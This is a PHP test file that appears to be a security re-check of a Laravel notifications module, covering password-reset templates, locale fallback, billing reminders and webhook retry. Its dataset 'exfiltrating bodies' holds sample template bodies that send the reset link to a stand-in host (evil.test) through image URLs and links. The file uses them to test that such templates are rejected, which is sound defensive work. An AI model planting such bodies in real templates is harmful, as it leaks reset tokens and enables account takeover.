<?php

use App\Events\Core\PasswordResetRequested;
use App\Models\User;
use App\Modules\Core\Support\Settings;
use App\Modules\Notifications\Enums\WebhookDeliveryStatus;
use App\Modules\Notifications\Jobs\DeliverWebhook;
use App\Modules\Notifications\Mail\TemplatedMail;
use App\Modules\Notifications\Models\EmailMessage;
use App\Modules\Notifications\Models\EmailTemplate;
use App\Modules\Notifications\Models\WebhookDelivery;
use App\Modules\Notifications\Models\WebhookEndpoint;
use App\Modules\Notifications\Webhooks\HostResolver;
use App\Modules\Notifications\Webhooks\WebhookPublisher;
use App\Modules\Notifications\Webhooks\WebhookSender;
use Illuminate\Auth\Notifications\ResetPassword;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Queue;

require_once __DIR__.'/helpers.php';
require_once __DIR__.'/../Billing/helpers.php';

/*
 * Review board + security re-check of PR #28 (round 2): B1 through the template body, locale fallback,
 * Billing's manual reminder, webhook dispatch recovery.
 */

dataset('exfiltrating bodies', [
    'image with the link in its URL' => ["![logo](https://evil.test/p.png?u={{ auth.reset_url }})\n\n[Choose a new password]({{ auth.reset_url }})"],
    'raw HTML image' => ["<img src=\"https://evil.test/p.png?u={{ auth.reset_url }}\">\n\n[Choose a new password]({{ auth.reset_url }})"],
    'link to another host' => ['[Choose a new password](https://evil.test/collect?u={{ auth.reset_url }})'],
    'the link in text' => ["Your link: {{ auth.reset_url }}\n\n[Choose a new password]({{ auth.reset_url }})"],
    'the link in another link\'s query' => ["[Help](https://localhost/help?from={{ auth.reset_url }})\n\n[Choose a new password]({{ auth.reset_url }})"],
    'a bare outside URL' => ["Visit https://evil.test/x\n\n[Choose a new password]({{ auth.reset_url }})"],
    'no action link' => ['Hello'],
]);

function resetTemplate(): EmailTemplate
{
    return EmailTemplate::query()->where('key', 'auth.password_reset')->sole();
}

it('B1: refuses to save a secret template that could leak its link', function (string $body) {
    seedEmailTemplates();
    actingAsStaff(['notifications.templates.view', 'notifications.templates.manage']);
    confirmPassword();

    $this->put(route('admin.notifications.templates.update', resetTemplate()), ['name' => 'Reset', 'locale' => 'en', 'subject' => 'Reset', 'body' => $body])
        ->assertSessionHasErrors('body');
})->with('exfiltrating bodies');

it('B1: accepts wording changes that keep the single action link', function () {
    seedEmailTemplates();
    actingAsStaff(['notifications.templates.view', 'notifications.templates.manage']);
    confirmPassword();

    $this->put(route('admin.notifications.templates.update', resetTemplate()), [
        'name' => 'Reset', 'locale' => 'en', 'subject' => 'Reset your password',
        'body' => "# New password\n\nHi {{ recipient.first_name }}, use the button.\n\n[Set a new password]({{ auth.reset_url }})\n\n[Open the client area]({{ system.client_area_url }})",
    ])->assertSessionHasNoErrors();
});

it('B1: a leaking body that bypassed validation still only reaches the recipient\'s button', function (string $body) {
    Mail::fake();
    seedEmailTemplates();
    resetTemplate()->translations()->update(['body' => $body]);
    $user = User::factory()->create(['email' => 'ann@example.test']);

    event(new PasswordResetRequested($user->id, 'https://localhost/reset-password/TOKEN123?email=ann%40example.test', 'soon', 'TOKEN123'));

    Mail::assertSent(TemplatedMail::class, function (TemplatedMail $mail): bool {
        $html = (string) $mail->htmlBody;

        // No attribute (href/src) points outside the app, no image carries the link, and the link appears
        // at most once (the button). Escaped text that mentions another host is harmless.
        return ! preg_match('/<[a-z][^<>]*\s(href|src)="[^"]*evil\.test/i', $html) && ! preg_match('/<img[^>]*TOKEN/i', $html)
            && substr_count($html, 'TOKEN123') <= 1;
    });
})->with('exfiltrating bodies');

it('2: sends the reset when the default language has no translation', function () {
    Mail::fake();
    Notification::fake();
    seedEmailTemplates();
    app(Settings::class)->set('notifications.default_locale', 'fr');
    $user = User::factory()->create();

    $this->post(route('password.email'), ['email' => $user->email]);

    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => $mail->hasTo($user->email));
    expect(EmailMessage::query()->sole())->locale->toBe('fr')->status->value->not->toBe('failed');
});

it('2: falls back to Laravel\'s reset mail when the template cannot render', function () {
    Mail::fake();
    Notification::fake();
    seedEmailTemplates();
    resetTemplate()->translations()->update(['body' => '{% if broken %}']);
    $user = User::factory()->create();

    $this->post(route('password.email'), ['email' => $user->email]);

    Notification::assertSentTo($user, ResetPassword::class);
});

it('2: a re-handled reset occurrence neither sends again nor triggers the fallback', function () {
    Mail::fake();
    Notification::fake();
    seedEmailTemplates();
    $user = User::factory()->create();
    $event = new PasswordResetRequested($user->id, 'https://localhost/reset-password/T', 'soon', 'T');

    event($event);
    event($event);

    Mail::assertSentCount(1);
    Notification::assertNothingSent();
});

it('3: Billing\'s manual "Send reminder" on a not-yet-overdue invoice sends the payment reminder', function () {
    Mail::fake();
    seedEmailTemplates();
    billingStaff();
    $client = billingClient(['email' => 'payer@example.test']);
    $invoice = issueInvoice($client, [5_000], now()->addDays(10)->toImmutable());

    $this->post(route('admin.billing.invoices.remind', $invoice))->assertRedirect();

    expect(EmailMessage::query()->where('template_key', 'invoice.payment_reminder')->pluck('recipient')->all())->toContain('payer@example.test');
});

it('5: a delivery whose job was lost is dispatched again once its lease expires', function () {
    Queue::fake();
    $endpoint = WebhookEndpoint::factory()->create(['events' => ['*']]);
    app(WebhookPublisher::class)->publish('invoice.paid', ['number' => 'INV-1'], [], 'lost-job');
    $delivery = WebhookDelivery::query()->sole();

    // The first job is lost. Nothing is due while the lease runs…
    $this->artisan('notifications:retry-webhooks')->assertSuccessful();
    Queue::assertPushed(DeliverWebhook::class, 1);

    // …then the next run takes the row again, and again if that job is lost too.
    $this->travel(6)->minutes();
    $this->artisan('notifications:retry-webhooks')->assertSuccessful();
    Queue::assertPushed(DeliverWebhook::class, 2);
    $this->travel(6)->minutes();
    $this->artisan('notifications:retry-webhooks')->assertSuccessful();
    Queue::assertPushed(DeliverWebhook::class, 3);

    // Once an attempt actually runs and succeeds, nothing is due any more.
    app()->instance(HostResolver::class, new class extends HostResolver
    {
        public function resolve(string $host): array
        {
            return ['93.184.216.34'];
        }
    });
    Http::fake([$endpoint->url => Http::response('ok')]);
    app(WebhookSender::class)->attempt($delivery->fresh('endpoint'));
    $this->travel(10)->minutes();
    $this->artisan('notifications:retry-webhooks')->assertSuccessful();

    expect($delivery->fresh())->status->toBe(WebhookDeliveryStatus::Succeeded)->next_attempt_at->toBeNull();
    Queue::assertPushed(DeliverWebhook::class, 3);
});

it('5: a job that dies makes its delivery due immediately', function () {
    $endpoint = WebhookEndpoint::factory()->create();
    $delivery = WebhookDelivery::query()->create(['event_id' => fake()->uuid(), 'webhook_endpoint_id' => $endpoint->id, 'event_type' => 'invoice.paid', 'payload' => [], 'attempt' => 1, 'status' => WebhookDeliveryStatus::Failed, 'next_attempt_at' => now()->addMinutes(5)]);

    (new DeliverWebhook($delivery->id))->failed(new RuntimeException('worker lost'));

    expect($delivery->fresh()->next_attempt_at->lte(now()))->toBeTrue();
});
